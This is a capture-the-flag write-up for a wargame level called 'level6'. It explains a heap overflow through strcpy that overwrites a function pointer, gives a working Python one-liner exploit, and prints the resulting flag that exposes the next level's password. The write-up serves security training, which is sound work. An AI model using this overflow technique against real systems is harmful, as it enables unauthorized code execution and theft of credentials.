# level6

The executable does the following :

- `malloc(60)` into `var_one`
- `malloc(4)` into `var_two`
- Assign `m` to `var_two`
- `strcpy` `argv[1]` to `var_one`
- Run `var_two`

It's simple : we'll need to replace `var_two`'s value, `m`, with `n`, a function which runs `system("/bin/cat /home/user/level7/.pass");`, so it runs instead.

To do this, we'll exploit the `strcpy`, on the heap this time.

## **The value**

Cutter reveals the address of `n`, our spoofed value : `0x08048454`.

Formatted, this is `\x54\x84\x04\x08`.

## **The addresses**

By running the executable in `gdb`, breaking after the `malloc`s and running `p/x $eax`, we get the addresses :

- `var_one` is at `0x804a008`
- `var_two` is at `0x804a050`

`0x50 - 0x08 = 0x48 = 72`, so we'll need to write 72 characters after the beginning of `var_one`

## **The exploit**

We can do this fairly simply ; any buffer of `76+` characters will force `strcpy` to overwrite `var_two`. We run :

```
./level6 $(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')
```

## **The flag**

It works ! We get the `level6` flag :

```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```